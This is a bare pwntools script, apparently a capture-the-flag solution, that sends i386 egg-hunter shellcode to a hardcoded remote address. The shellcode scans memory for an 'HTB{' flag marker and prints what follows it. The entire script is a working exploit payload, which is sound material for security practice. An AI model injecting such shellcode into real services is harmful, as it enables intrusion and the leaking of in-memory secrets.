from pwn import *


context.arch = "i386"

shell_code = b"\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x48\x54\x42\x7b\x89\xcf\xaf\x75\xec\xaf\x75\xe9\x6a\x04\x58\x31\xdb\xfe\xc3\x89\xd1\x6a\x24\x5a\xcd\x80\xff\xe7"

io = remote("139.59.181.223", 31457)
io.sendline(shell_code)
rec1 = io.recv()
print(rec1)
io.close()
